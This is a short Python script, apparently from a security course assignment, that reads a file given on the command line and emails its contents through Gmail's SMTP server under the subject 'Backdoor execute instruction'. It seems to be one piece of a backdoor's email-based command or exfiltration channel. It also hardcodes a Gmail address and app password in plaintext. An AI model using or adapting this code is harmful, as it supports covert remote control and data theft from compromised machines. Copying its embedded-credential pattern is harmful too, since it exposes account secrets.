import smtplib
import sys

your_email = "comp6841student@gmail.com"  # What is your email?
your_email_pass = "fcfn euzu phly qzsb "  # What is your email password

data = "Subject: Backdoor execute instruction\n\n" + open(sys.argv[1]).read()

server = smtplib.SMTP("smtp.gmail.com:587")
server.starttls()
server.login(your_email, your_email_pass)
server.sendmail(your_email, your_email, data)
server.close()
